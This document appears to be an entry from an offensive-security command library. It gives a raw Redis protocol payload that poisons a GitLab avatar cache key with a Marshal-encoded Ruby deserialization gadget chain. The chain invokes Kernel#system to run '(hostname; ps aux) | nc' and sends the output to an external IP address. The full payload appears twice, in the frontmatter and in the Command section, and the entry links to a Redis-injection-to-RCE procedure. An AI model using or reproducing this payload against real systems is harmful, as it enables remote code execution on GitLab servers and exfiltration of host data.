---
id: cmd-redis-poison-cache
name: redis-set-poison-cache
type: command
executor: redis-cli
data: >-
  \r\n*3\r\n$3\r\nset\r\n$39\r\ncache:gitlab:avatar:yvvdwf/xss:16210710\r\n$347\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\u0006a\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\".(hostname;
  ps aux) | nc 51.75.74.52 11211\u0006;\fT;\u0012:\fresolve\r\n\r\n
output: 500 error on project access due to deserialization attempt
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.302Z'
platforms:
  - Linux
tags:
  - redis
  - cache-poisoning
  - deserialization
verified: false
validated: true
submitted: true
---

# redis-set-poison-cache

## Command

```bash
\r\n*3\r\n$3\r\nset\r\n$39\r\ncache:gitlab:avatar:yvvdwf/xss:16210710\r\n$347\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\u0006a\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\".(hostname; ps aux) | nc 51.75.74.52 11211\u0006;\fT;\u0012:\fresolve\r\n\r\n
```

## Description

Sets a poisoned cache key with Marshal-encoded Ruby gadget chaining Gem classes to invoke system command via method chaining.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| key | Cache key: cache:gitlab:avatar:yvvdwf/xss:16210710 | Yes |
| value | Encoded malicious object | Yes |

## Examples

### Basic Usage

As shown (raw Redis protocol).

## Expected Output

OK, leading to deserialization errors on cache read.

## Related

- [[procedures/Exploit-Redis-Injection-for-RCE]]
